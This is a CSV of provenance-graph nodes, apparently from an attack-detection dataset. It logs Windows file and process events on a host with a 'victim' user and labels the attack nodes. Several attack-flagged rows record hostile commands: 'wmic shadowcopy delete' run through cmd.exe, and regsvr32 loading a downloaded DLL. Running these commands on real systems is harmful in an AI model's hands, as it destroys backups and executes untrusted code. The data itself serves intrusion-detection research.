uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
d4f4c13a-35c3-4be0-b642-728259d07143,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Confe64a9051#\\434f871c532673e1359654ad68a1c225\\System.Configuration.Install.ni.dll.aux'},1700,False,10,0,10,10,0,10
da7bd8ba-8602-4c3f-9470-66c8add515a6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive'},1705,False,10,0,10,10,0,10
d792fb05-b79a-4852-8a4f-09cf024aa0c0,"{'subject': '""C:\\Windows\\SystemApps\\Microsoft.Windows.AppRep.ChxApp_cw5n1h2txyewy\\CHXSmartScreen.exe"" -ServerName:App.AppXk7vvv12h4qrkhkbvf6j86ja45mzj5km9.mca'}",10320,False,0,3,3,0,9,9
245d5d4d-88ca-4255-8494-09603689f98c,{'subject': 'regsvr32  C:\\Users\\victim\\Downloads\\REASONABLE_GRASS.dll'},1777,True,0,8,8,0,8,8
6e90d057-e0cc-4839-885c-c1623ac1e359,{'file': 'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Management\\Microsoft.PowerShell.Management.psd1'},7174,False,7,0,7,7,0,7
6267348e-369a-43da-bafc-f734632b0024,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\Microsoft.Pae3498d9#\\540be536249c14bcd4d722f9edf5d2b8\\Microsoft.PowerShell.Commands.Management.ni.dll.aux'},7176,False,7,0,7,7,0,7
4d7de498-6fe8-4881-a9f2-f5e23e62e1a8,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Serv759bfb78#\\e2ca4e2ddffdc0d0bda3f2ca65249790\\System.ServiceProcess.ni.dll.aux'},7180,False,7,0,7,7,0,7
c5cdf522-199e-4fe1-8775-6fed96488019,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Windows.Forms\\8162fd84baf0b737d3f6b4a159c8fcf0\\System.Windows.Forms.ni.dll.aux'},7184,False,7,0,7,7,0,7
373ffb10-be01-4ab3-a03e-8df873a0dcd5,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\winspool.drv'},236,False,6,0,6,6,0,6
d96b70fe-06c6-4672-a9df-87829b434039,{'subject': 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wuauserv'},268,False,0,1,1,0,6,6
5e1c808f-c45f-44bd-a1ae-4fdb94906b8f,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\WinMetadata\\Windows.Foundation.winmd'},304,False,2,0,2,6,0,6
ea67f9a5-7457-4a87-90ac-bcc5949e685c,{'file': 'C:\\Users\\victim\\Desktop\\desktop.ini'},600,False,6,0,6,6,0,6
a5f1ff09-4240-43be-8c6e-fe9aa85546ae,{'file': 'C:\\Users\\victim\\Downloads\\desktop.ini'},605,False,6,0,6,6,0,6
049f1d28-ac75-4cbb-ad04-ce9a62f5bc81,{'subject': 'C:\\Windows\\system32\\cmd.exe /c post-install.bat'},1107,False,0,2,2,0,6,6
8843fb93-af95-4ba6-941c-6948c292efcd,{'file': 'C:\\Users\\victim\\Downloads\\PERFECT_AGLET.exe'},2705,True,6,0,6,6,0,6
28002c65-863f-492b-b732-a98f33faecdb,"{'subject': '""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26010.5-0\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges'}",2714,False,0,1,1,0,6,6
b085d1af-3c4c-4161-9cb9-ea1c932d0272,{'subject': 'consent.exe 9988 384 000001D65B458520'},10418,False,0,6,6,0,6,6
333e8522-2579-496a-b590-2f07cd47afc5,"{'subject': 'cmd.exe /c ""wmic.exe shadowcopy delete""'}",10645,True,0,6,6,0,6,6
44358bf9-5515-4cb8-9bca-653ff7a14095,{'file': '\\Device\\HarddiskVolume1\\Windows\\System32\\WinMetadata\\Windows.UI.winmd'},310,False,2,0,2,5,0,5
1c28bd82-ee25-4536-b908-e7c8cf2d2e2b,{'file': 'C:\\Users\\desktop.ini'},888,False,5,0,5,5,0,5
8b750003-b0f7-445e-a38b-95b956113fe9,"{'subject': '""C:\\Users\\victim\\Desktop\\cmder\\vendor\\conemu-maximus5\\ConEmu\\ConEmuC64.exe""  /CINMODE=600020 /AID=8704 /GID=3672 /GHWND=000705F8 /BW=230 /BH=53 /BZ=1000 ""/FN=Lucida Console"" /FW=3 /FH=5 /TA=10100007 /HIDE /ROOT cmd /k """"%ConEmuDir%\\..\\init.bat"" ""'}",978,False,0,2,2,0,5,5
8fd7a70c-729d-46fa-935b-4c2eea979f24,"{'subject': 'C:\\Windows\\System32\\find  /i "" ""'}",993,False,0,1,1,0,5,5
2f7bdf8f-4e19-466d-85b0-543e22f5b0da,{'file': 'C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\6078762b90671c2ff9ba39318e2176d8\\mscorlib.ni.dll'},1652,False,5,0,5,5,0,5
937643fb-ca8e-4afd-afd1-f344da5aa0fe,{'subject': 'whoami'},1783,False,0,3,3,0,5,5
d6a523b5-3afc-4051-ac35-20002b78f058,"{'subject': '""C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.26010.5-0\\MpCmdRun.exe"" Scan -ScheduleJob -RestrictPrivileges -ScanType 1 -ScanTrigger 59'}",2719,False,0,1,1,0,5,5
55e72444-2d75-44a9-b0a7-427742e0d0ad,{'file': 'C:\\Windows\\system32\\netprofm.dll'},3162,False,1,0,1,5,0,5
7ecf2a5d-5295-4e46-a1b3-5ff32e564a8a,{'subject': 'wmic.exe  shadowcopy delete'},10648,False,0,3,3,0,5,5
e02ab5d2-48c2-4dbc-80c8-067e23c8217a,{'file': 'C:\\Users\\victim\\Documents\\desktop.ini'},601,False,4,0,4,4,0,4
af2d1fc1-2d41-4006-b65b-5edb2a4783bc,{'file': 'C:\\Users\\victim\\Music\\desktop.ini'},602,False,4,0,4,4,0,4
6e1cbe73-19e2-491e-9766-eb025080775f,{'file': 'C:\\Users\\victim\\Pictures\\desktop.ini'},603,False,4,0,4,4,0,4
